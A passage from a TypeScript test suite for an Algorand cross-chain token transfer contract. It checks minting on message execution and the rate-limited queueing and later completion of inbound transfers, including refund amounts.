        amount: APP_MIN_BALANCE,
      });
      const res = await client
        .newGroup()
        .addTransaction(fundingTxn)
        .executeMessage({
          sender: relayer,
          args: [messageReceived],
          appReferences: [transceiverManagerAppId],
          boxReferences: [
            getMessagesExecutedBoxKey(messageDigest),
            getBucketBoxKey(inboundBucketId),
            getInboundQueuedTransfersBoxKey(messageDigest),
          ],
          extraFee: (3000).microAlgos(),
        })
        .send();

      // check logs
      expect(res.confirmations[1].innerTxns![2].logs![0]).toEqual(
        getEventBytes("Minted(address,uint64)", [user.toString(), untrimmedAmount]),
      );
    });
  });

  describe("complete inbound queued transfer", () => {
    let queuedTransferMessageDigest: Uint8Array;
    const untrimmedAmount = INBOUND_LIMIT + 10_000n;

    beforeAll(async () => {
      // prepare message
      const inboundBucketId = getInboundBucketIdBytes(PEER_CHAIN_ID);
      const amount = untrimmedAmount / 10_000n;
      const messageReceived = getMessageReceived(
        PEER_CHAIN_ID,
        getRandomMessageToSend({
          sourceAddress: PEER_CONTRACT,
          destinationChainId: Number(SOURCE_CHAIN_ID),
          handlerAddress: getApplicationAddress(appId).publicKey,
          payload: getNttPayload(PEER_DECIMALS, amount, getRandomBytes(32), user.publicKey, SOURCE_CHAIN_ID),
        }),
      );
      queuedTransferMessageDigest = calculateMessageDigest(messageReceived);
      await transceiverManagerClient.send.setMessageDigest({ args: [queuedTransferMessageDigest] });

      // execute message
      const APP_MIN_BALANCE = (68_600).microAlgo();
      const fundingTxn = await localnet.algorand.createTransaction.payment({
        sender: relayer,
        receiver: getApplicationAddress(appId),
        amount: APP_MIN_BALANCE,
      });
      await client
        .newGroup()
        .addTransaction(fundingTxn)
        .executeMessage({
          sender: relayer,
          args: [messageReceived],
          appReferences: [transceiverManagerAppId],
          boxReferences: [
            getMessagesExecutedBoxKey(queuedTransferMessageDigest),
            getBucketBoxKey(inboundBucketId),
            getInboundQueuedTransfersBoxKey(queuedTransferMessageDigest),
          ],
          extraFee: (2000).microAlgos(),
        })
        .send();

      // ensure queued
      await client.getInboundQueuedTransfer({ args: [queuedTransferMessageDigest] });
    });

    test("fails when the transfer is unknown", async () => {
      const messageDigest = getRandomBytes(32);
      await expect(
        client.send.completeInboundQueuedTransfer({
          sender: user,
          args: [messageDigest],
          boxReferences: [getInboundQueuedTransfersBoxKey(messageDigest)],
        }),
      ).rejects.toThrow("Unknown inbound queued transfer");
    });

    test("fails when insufficient time has elapsed", async () => {
      // ensure insufficient time has passed
      const inboundQueuedTransfer = await client.getInboundQueuedTransfer({ args: [queuedTransferMessageDigest] });
      const latestTimestamp = await getPrevBlockTimestamp(localnet);
      const targetTimestamp = inboundQueuedTransfer[1][0] + INBOUND_DURATION;
      expect(latestTimestamp).toBeLessThan(targetTimestamp);

      // complete inbound queued transfer
      await expect(
        client.send.completeInboundQueuedTransfer({
          sender: user,
          args: [queuedTransferMessageDigest],
          boxReferences: [getInboundQueuedTransfersBoxKey(queuedTransferMessageDigest)],
        }),
      ).rejects.toThrow("Inbound queued transfer is still queued");
    });

    test("succeeds", async () => {
      // advance till sufficient time has passed
      const inboundQueuedTransfer = await client.getInboundQueuedTransfer({ args: [queuedTransferMessageDigest] });
      const latestTimestamp = await getPrevBlockTimestamp(localnet);
      const targetTimestamp = inboundQueuedTransfer[1][0] + INBOUND_DURATION;
      await advancePrevBlockTimestamp(localnet, targetTimestamp - latestTimestamp);

      // complete inbound queued transfer
      const res = await client.send.completeInboundQueuedTransfer({
        sender: user,
        args: [queuedTransferMessageDigest],
        boxReferences: [getInboundQueuedTransfersBoxKey(queuedTransferMessageDigest)],
        extraFee: (2000).microAlgos(),
      });

      // check logs
      expect(res.confirmations[0].logs![0]).toEqual(
        getEventBytes("InboundTransferDeleted(byte[32])", [queuedTransferMessageDigest]),
      );
      expect(res.confirmations[0].innerTxns![0].logs![0]).toEqual(
        getEventBytes("Minted(address,uint64)", [user.toString(), untrimmedAmount]),
      );

      // check refund
      expect(res.confirmations[0].innerTxns!.length).toEqual(2);
      const APP_MIN_BALANCE = (68_600 - 22_900).microAlgos();
      expect(res.confirmations[0].innerTxns![1].txn.txn.type).toEqual("pay");
      expect(res.confirmations[0].innerTxns![1].txn.txn.payment!.amount).toEqual(APP_MIN_BALANCE.microAlgo);
      expect(res.confirmations[0].innerTxns![1].txn.txn.payment!.receiver.toString()).toEqual(user.toString());
    });
  });
});
